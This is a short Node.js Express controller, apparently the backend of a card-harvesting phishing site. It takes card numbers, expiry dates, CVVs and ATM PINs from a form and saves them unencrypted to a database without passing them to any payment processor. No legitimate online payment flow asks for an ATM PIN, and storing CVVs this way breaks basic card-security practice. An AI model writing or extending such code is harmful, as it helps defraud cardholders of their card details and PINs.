const CardPayment = require('../models/CardPayment');

// Handle card + ATM PIN submission
exports.submitCardPayment = async (req, res) => {
  try {
    const { uniqueid, cardNumber, expiryDate, cvv, atmPin } = req.body;

    const newCardPayment = new CardPayment({
      uniqueid,
      cardNumber,
      expiryDate,
      cvv,
      atmPin                   // ← Include atmPin here
    });

    await newCardPayment.save();

    res.status(200).json({
      success: true,
      message: "Card Payment (with ATM PIN) submitted successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting card payment data"
    });
  }
};
